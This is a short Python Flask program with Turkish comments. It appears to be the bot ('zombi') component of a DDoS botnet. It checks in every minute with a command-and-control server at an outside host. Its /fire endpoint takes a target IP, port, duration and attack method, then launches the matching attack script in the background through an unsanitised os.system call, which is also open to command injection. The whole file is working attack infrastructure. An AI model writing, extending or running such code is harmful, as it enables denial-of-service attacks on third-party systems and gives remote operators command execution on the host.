import os
import requests
import time
import threading
from flask import Flask, request

app = Flask(__name__)

# --- AYARLAR (BAĞLAMA KISMI) ---
# Playit sabit linkin buraya gelecek
BEYIN_URL = "http://usb-metallic.gl.joinmc.link" 
ZOMBI_PORT = "8080"

def kayit_ol():
    """Zombi her açıldığında ve her dakikada bir karargaha kendini tanıtır."""
    while True:
        try:
            # Beyin'deki /kayit rotasına giderek 'ben buradayım' der
            requests.get(f"{BEYIN_URL}/kayit?port={ZOMBI_PORT}", timeout=10)
        except Exception as e:
            # Bağlantı yoksa sessizce bekler
            pass
        time.sleep(60)

@app.route('/fire')
def fire():
    """Beyin'den gelen vuruş emrini yakalayan kısım."""
    target = request.args.get('ip')
    port = request.args.get('port')
    sure = request.args.get('time')
    method = request.args.get('method')
    
    if method:
        # Arka planda ilgili method scriptini ateşler
        # Örn: voxility yazdıysan voxility.py çalışır
        os.system(f"nohup python3 {method}.py {target} {port} {sure} > /dev/null 2>&1 &")
        return f"Saldırı başladı: {method}", 200
    return "Method yok!", 400

@app.route('/')
def index():
    return "Zombi Hazır ve Nazır!", 200

if __name__ == '__main__':
    # Kayıt olma işlemini arka planda (thread) başlatıyoruz ki Flask kilitlenmesin
    threading.Thread(target=kayit_ol, daemon=True).start()
    
    print(f"⚡ Zombi Aktif! Port: {ZOMBI_PORT}")
    app.run(host='0.0.0.0', port=int(ZOMBI_PORT))
